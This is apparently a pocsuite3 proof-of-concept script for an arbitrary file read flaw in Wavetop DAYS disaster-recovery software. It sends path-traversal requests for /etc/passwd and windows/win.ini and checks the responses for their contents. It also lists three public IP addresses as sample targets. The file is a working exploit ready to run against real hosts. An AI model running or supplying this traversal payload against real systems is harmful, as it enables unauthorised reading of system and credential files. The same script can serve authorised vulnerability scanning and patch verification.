#!/usr/bin/env python
# coding: utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json

class TestPOC(POCBase):
	vulID = '''DSO-06706'''
	cweID = "CWE-494"
	appDevLanguage = ""
	appCategory = ""
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = '''1.0'''
	author = ''''''
	vulDate = '''2022-06-27'''
	createDate = '''2022-06-29'''
	updateDate = '''2022-07-25'''
	name = '''浪擎科技 DAYS容灾软件存在任意文件读取漏洞'''
	desc = '''浪擎科技 DAYS容灾软件存在任意文件读取漏洞，攻击者可利用该漏洞获取系统敏感信息等。'''
	solution = '''<p>请关注厂商并更新至安全版本</p>
<p>厂商链接: http://www.wavetop.com.cn/</p>'''
	severity = '''medium'''
	vulType = '''file-download'''
	taskType = '''app-vul'''
	proto = ['http']
	scanFlag = 1
	tag = ['important']
	references = ['''''']
	appName = '''浪擎DAYS灾备软件'''
	appVersion = '''all'''
	appPowerLink = ''''''
	samples = ['''https://119.191.58.13:4433/''','''http://223.247.190.42:8000''','''http://60.190.175.98:8000''']
	install_requires = ['''''']
	def _attack(self):
		return self._verify()

	def _verify(self):
		result = {}
		paths = ["/download/index.php?file=../../../../../../../../../windows/win.ini", "/download/index.php?file=../../../../../../../../../etc/passwd"]
		for path in paths:
			target = self.url + path
			resp = requests.get(target, verify = False, allow_redirects = False, timeout = 10)
			if ('/root:/bin/bash' in resp.text or '; for 16-bit app support' in resp.text) and resp.status_code ==200:
				result['VerifyInfo'] = {}
				result['VerifyInfo']['URL'] = self.url
				result['VerifyInfo']['Content'] = resp.text[:200]
				break
		return self.parse_verify(result)

	def parse_verify(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

register_poc(TestPOC)
